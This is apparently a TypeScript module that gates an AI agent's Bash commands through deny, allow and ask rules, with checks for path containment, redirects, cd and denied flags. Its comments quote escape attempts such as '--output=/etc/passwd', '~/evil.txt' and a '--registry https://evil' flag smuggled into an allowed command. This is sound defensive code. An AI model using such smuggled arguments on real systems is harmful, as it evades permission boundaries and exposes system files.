/**
 * Per-segment evaluation of a model-authored Bash command (spec §4 US-005).
 *
 * Precedence, fixed and order-independent within a stage (spec R6 + US-005.3):
 *   1. the lexer's own refusal    -> deny (a payload the gate cannot read)
 *   2. ANY segment matches deny   -> deny the whole call
 *   3. EVERY segment must match an allow rule, else deny
 *   4. payload checks per segment -> DENIED_FLAGS, containment, redirects, cd
 *   5. ANY segment matches ask    -> ask
 * Ask is evaluated LAST so it can never grant: an ungranted command that
 * matches an ask rule is a plain denial, not an approval prompt (the same
 * rule the path and argv branches follow in policy.ts).
 *
 * Containment is INJECTED (`resolvePath`), not imported: `policy.ts` imports
 * this module, so importing `resolveWithin` back would be a cycle. The single
 * owner of the root boundary, the `.git/` refusal and the execTouchedPaths
 * carve-out therefore remains `policy.ts`.
 */

import type { BashSegment, BashToken } from "@/permissions";
import { lexBashCommand } from "@/permissions";
import { deniedFlag } from "./exec-guard";
import type { CompiledEntry, CompiledPattern } from "./policy-match";

export type BashCheck =
  | { readonly kind: "allow" }
  | { readonly kind: "ask"; readonly rule: string }
  | { readonly kind: "deny"; readonly reason: string; readonly breach: boolean };

export interface BashCheckArgs {
  readonly tool: string;
  readonly command: unknown;
  /** The stage's compiled ALLOW entry for this tool. */
  readonly grant: CompiledEntry;
  readonly denyEntry?: CompiledEntry;
  readonly askEntry?: CompiledEntry;
  /** Absolute resolved path, or null when the candidate escapes the root or
   * enters `.git/`. Supplied by policy.ts (see the header). */
  readonly resolvePath: (candidate: string) => string | null;
}

function deny(reason: string, breach = false): BashCheck {
  return { kind: "deny", reason, breach };
}

/**
 * Prefix match, token-wise, with the two rules Exec's `matchesArgvPattern`
 * does not have:
 *
 * - a TRAILING `*` is OPTIONAL, because the spec requires `Bash(bun test *)`
 *   to admit bare `bun test` as well as `bun test src/x.test.ts`;
 * - an OPAQUE token (one that contained `$`-expansion) is matched only by a
 *   bare `*` pattern token. A rule naming a literal must never be satisfied by
 *   a word whose runtime value this gate cannot see.
 */
function matchesTokens(patternTokens: readonly CompiledPattern[], tokens: readonly BashToken[]): boolean {
  const required =
    patternTokens.length > 0 && patternTokens[patternTokens.length - 1]?.source === "*"
      ? patternTokens.slice(0, -1)
      : patternTokens;
  if (tokens.length < required.length) return false;
  return required.every((pattern, index) => {
    const token = tokens[index] as BashToken;
    if (token.opaque && pattern.source !== "*") return false;
    return pattern.re.test(token.text);
  });
}

function matchesSegment(entry: CompiledEntry, segment: BashSegment): boolean {
  if (entry.unconditional) return true;
  return entry.argvPatterns.some((tokens) => matchesTokens(tokens, segment.tokens));
}

/** `Tool` for an unconditional entry, else `Tool(<the pattern that matched>)`. */
function ruleExpr(tool: string, entry: CompiledEntry, segment?: BashSegment): string {
  if (entry.unconditional) return tool;
  const sources = entry.raw.filter((pattern) => pattern !== "*");
  const index =
    segment === undefined ? -1 : entry.argvPatterns.findIndex((tokens) => matchesTokens(tokens, segment.tokens));
  const matched = index === -1 ? undefined : sources[index];
  return `${tool}(${matched ?? entry.raw.join(", ")})`;
}

function render(segment: BashSegment): string {
  return segment.tokens.map((token) => token.text).join(" ");
}

/**
 * The filesystem path a word can actually address, once a prefix is stripped.
 *
 * A word carrying a separator is not necessarily the path: `--output=/etc/passwd`
 * and `-o/etc/passwd` both hide one behind a flag, and `resolveWithin` reads the
 * whole word as a RELATIVE path (`<root>/--output=/etc/passwd`), so the escape
 * lives in the embedded value while the raw word looks contained. Extract it:
 *
 *   --output=/etc/passwd -> /etc/passwd   (value after an `=` that precedes a separator)
 *   -o/etc/passwd        -> /etc/passwd   (from the first separator on a `-`-led word)
 *   ../etc/passwd        -> ../etc/passwd (no prefix: the word itself)
 *   link                 -> link          (no prefix: a bare word can be a symlink out)
 *
 * The last line is why this runs on EVERY non-opaque word rather than only the
 * separator-bearing ones: a bare `link` can be a symlink to a target outside the
 * root, and a word that does not exist safely joins under the root because
 * `realOrRaw` walks up to the nearest existing ancestor and never throws.
 */
function containmentTarget(text: string): string {
  const slash = text.indexOf("/");
  if (slash === -1) return text;
  const equals = text.indexOf("=");
  if (equals !== -1 && equals < slash) return text.slice(equals + 1);
  if (text.startsWith("-")) return text.slice(slash);
  return text;
}

function checkPayload(args: BashCheckArgs, segment: BashSegment): BashCheck | undefined {
  const words = segment.tokens.map((token) => token.text);

  // Same list and normalizer as Exec: a prefix grant gates the verb, never the
  // payload, so `bun add x --registry https://evil` satisfies `bun add *`.
  const flag = deniedFlag(words);
  if (flag !== undefined) return deny(`flag ${flag} is not permitted in a Bash command`);

  for (const token of segment.tokens) {
    // An opaque word has no value here, so containment cannot judge it — and it
    // already cannot satisfy a literal rule token (see matchesTokens).
    if (token.opaque) continue;
    const target = containmentTarget(token.text);
    if (target.startsWith("~")) {
      return deny(
        `token "${token.text}" addresses "${target}", which starts with "~" and depends on expansion this gate cannot resolve`,
      );
    }
    if (args.resolvePath(target) === null) {
      return deny(
        `token "${token.text}" addresses "${target}", which resolves outside the permitted root, or into .git/`,
        true,
      );
    }
  }

  // `cd` moves every LATER segment's frame of reference, so its target is
  // containment-checked even when it carries no separator (`cd ..`).
  if (words[0] === "cd") {
    const target = segment.tokens[1];
    if (target === undefined) return deny("`cd` with no target is refused");
    if (target.opaque || args.resolvePath(target.text) === null) {
      return deny(`cd target "${target.text}" is not inside the permitted root`, true);
    }
  }

  for (const redirect of segment.redirects) {
    if (redirect.opaque) {
      return deny(`redirect target "${redirect.target}" depends on expansion this gate cannot resolve`);
    }
    // Redirect targets are NOT in `segment.tokens`, and `resolveWithin` does not
    // expand `~`: it would read `~/evil.txt` as the literal `<root>/~/evil.txt`
    // and wave it through, while `/bin/sh` writes to `$HOME/evil.txt`. Mirrors
    // the `~` guard on the token loop above.
    if (redirect.target.startsWith("~")) {
      return deny(
        `redirect target "${redirect.target}" starts with "~", which depends on expansion this gate cannot resolve`,
      );
    }
    if (args.resolvePath(redirect.target) === null) {
      return deny(`redirect target "${redirect.target}" resolves outside the permitted root`, true);
    }
  }

  return undefined;
}

export function checkBashCommand(args: BashCheckArgs): BashCheck {
  const { command, tool } = args;
  if (typeof command !== "string") return deny(`"command" must be a string`);
  if (command.trim() === "") return deny(`"command" must not be empty`);

  const lexed = lexBashCommand(command);
  if (lexed.kind === "refused") {
    return deny(
      `command contains ${lexed.construct}, which cannot be analysed and is therefore refused -- ` +
        "rewrite it without that construct, or use a structured tool",
    );
  }

  for (const segment of lexed.segments) {
    if (args.denyEntry !== undefined && matchesSegment(args.denyEntry, segment)) {
      return deny(
        `${tool} segment "${render(segment)}" is denied for this stage by rule ${ruleExpr(tool, args.denyEntry, segment)}`,
      );
    }
  }

  for (const segment of lexed.segments) {
    if (args.grant.unconditional || matchesSegment(args.grant, segment)) continue;
    const granted = args.grant.raw.filter((pattern) => pattern !== "*").join(", ");
    const alternatives = granted === "" ? "no command forms are granted for this stage" : `granted forms: ${granted}`;
    return deny(`${tool} is not granted "${render(segment)}" -- ${alternatives}`);
  }

  for (const segment of lexed.segments) {
    const refusal = checkPayload(args, segment);
    if (refusal !== undefined) return refusal;
  }

  for (const segment of lexed.segments) {
    if (args.askEntry !== undefined && matchesSegment(args.askEntry, segment)) {
      return { kind: "ask", rule: ruleExpr(tool, args.askEntry, segment) };
    }
  }

  return { kind: "allow" };
}
